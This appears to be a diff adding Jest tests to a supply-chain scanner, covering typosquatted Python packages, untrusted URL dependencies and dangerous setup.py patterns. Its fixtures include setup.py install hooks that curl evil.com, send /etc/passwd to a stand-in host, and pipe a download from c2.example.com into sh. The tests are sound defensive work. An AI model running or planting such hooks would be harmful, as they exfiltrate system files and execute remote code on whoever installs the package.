@@ -353,6 +353,316 @@ describe('SupplyChainScanner', () => {
     });
   });
 
+  // --- SUPPLY-007: Python malicious/typosquatted packages ---
+
+  describe('SUPPLY-007: Python malicious packages', () => {
+    test('detects typosquatted package in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'colourama==0.4.4\nrequests==2.28.0\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].severity).toBe('critical');
+        expect(matches[0].message).toMatch(/colourama/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects known malicious package ctx in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'flask==2.0.0\nctx==0.1.2\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/ctx/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects typosquatted setup-tools in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'setup-tools==57.0.0\nnumpy==1.24.0\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/setup-tools/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects malicious package in pyproject.toml dependencies', async () => {
+      const dir = createTempSkills({
+        'pyproject.toml': [
+          '[project]',
+          'dependencies = [',
+          '    "requests>=2.28",',
+          '    "pycrypto>=2.6",',
+          ']',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/pycrypto/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects malicious package in pyproject.toml build-system', async () => {
+      const dir = createTempSkills({
+        'pyproject.toml': [
+          '[build-system]',
+          'requires = ["setup-tools>=42", "wheel"]',
+          'build-backend = "setuptools.build_meta"',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/setup-tools/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects pip as dependency in setup.py install_requires', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'from setuptools import setup',
+          'setup(',
+          '    name="myapp",',
+          '    install_requires=["pip", "requests"],',
+          ')',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/pip/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('does not flag legitimate packages in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'requests==2.28.0\nnumpy>=1.24\nflask[async]==2.3.0\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('ignores SUPPLY-007 for non-Python-dep files', async () => {
+      const dir = createTempSkills({
+        'notes.txt': 'ctx is a bad package\nsetup-tools warning\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-007');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+  });
+
+  // --- SUPPLY-008: Suspicious URL-based Python dependencies ---
+
+  describe('SUPPLY-008: Suspicious URL Python dependencies', () => {
+    test('detects suspicious VCS URL dependency in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'git+https://evil-hacker.com/malware.git#egg=requests\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-008');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].severity).toBe('high');
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects direct HTTP URL dependency in requirements.txt', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'https://badactor.net/packages/mylib-1.0.tar.gz\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-008');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('does not flag trusted GitHub VCS URL', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'git+https://github.com/psf/requests.git@main#egg=requests\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-008');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('does not flag PyPI-hosted package URLs', async () => {
+      const dir = createTempSkills({
+        'requirements.txt': 'https://files.pythonhosted.org/packages/requests-2.28.0.tar.gz\n',
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-008');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+  });
+
+  // --- SUPPLY-009: Dangerous setup.py patterns ---
+
+  describe('SUPPLY-009: Dangerous setup.py patterns', () => {
+    test('detects cmdclass install override (postinstall hook)', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'from setuptools import setup',
+          'from setuptools.command.install import install',
+          'class PostInstall(install):',
+          '    def run(self):',
+          '        install.run(self)',
+          '        import subprocess',
+          '        subprocess.call(["curl", "evil.com/beacon"])',
+          'setup(',
+          '    name="myapp",',
+          '    cmdclass={"install": PostInstall},',
+          ')',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].severity).toBe('critical');
+        expect(matches[0].message).toMatch(/cmdclass.*install/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects subprocess.run in setup.py', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'import subprocess',
+          'from setuptools import setup',
+          'subprocess.run(["curl", "-s", "http://evil.com/collect", "--data", open("/etc/passwd").read()])',
+          'setup(name="mylib")',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/subprocess/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects os.system() in setup.py', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'import os',
+          'from setuptools import setup',
+          'os.system("curl http://c2.example.com/init | sh")',
+          'setup(name="mylib")',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/os\.system/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('detects cmdclass develop override', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'from setuptools import setup',
+          'setup(name="myapp", cmdclass={"develop": MaliciousDevelop})',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches.length).toBeGreaterThanOrEqual(1);
+        expect(matches[0].message).toMatch(/cmdclass.*develop/i);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('does not flag SUPPLY-009 in non-setup.py files', async () => {
+      const dir = createTempSkills({
+        'app.py': [
+          'import subprocess',
+          'result = subprocess.run(["ls", "-la"])',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+
+    test('does not flag clean setup.py', async () => {
+      const dir = createTempSkills({
+        'setup.py': [
+          'from setuptools import setup',
+          'setup(',
+          '    name="myapp",',
+          '    version="1.0",',
+          '    install_requires=["requests>=2.0", "click>=8.0"],',
+          ')',
+        ].join('\n'),
+      });
+      try {
+        const result = await scanner.scan(dir);
+        const matches = result.findings.filter((f) => f.rule === 'SUPPLY-009');
+        expect(matches).toHaveLength(0);
+      } finally {
+        cleanup(dir);
+      }
+    });
+  });
+
   // --- Integration ---
 
   describe('Integration', () => {
